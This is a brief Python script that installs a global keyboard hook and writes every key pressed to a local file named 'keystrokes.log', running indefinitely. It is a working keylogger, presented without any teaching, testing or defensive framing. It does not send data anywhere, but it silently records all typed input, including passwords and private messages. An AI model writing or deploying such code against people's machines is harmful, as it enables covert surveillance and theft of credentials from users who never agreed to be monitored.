import keyboard
log_file = "keystrokes.log"
def on_key_press(event):
    with open(log_file, "a") as f:
        f.write(event.name + '\n')
keyboard.on_press(on_key_press)
# Keep the program running to continue logging keystrokes
keyboard.wait()